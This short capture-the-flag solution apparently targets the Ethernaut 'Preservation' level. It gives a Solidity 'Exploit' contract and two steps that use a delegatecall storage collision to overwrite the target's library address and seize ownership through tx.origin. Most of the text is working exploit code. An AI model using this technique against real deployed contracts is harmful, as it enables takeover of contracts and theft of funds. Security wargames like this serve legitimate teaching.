Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Preservation {
    function setFirstTime(uint) external;

}

contract Exploit {

    address public o;
    address public p;
    address public owner;

    function exploit(address _who) public {
        Preservation(_who).setFirstTime(uint(address(this)));
    }

    function test(uint add) public pure returns (address) {
       return address(add); 
    }

    function test2(address add) public pure returns (uint) {
        return uint(add);
    }

    function setTime(uint _time) public {
        owner = address(tx.origin);
    }
}
```
- Call exploit()
- Call setTime() on your ocntract instance, with any value
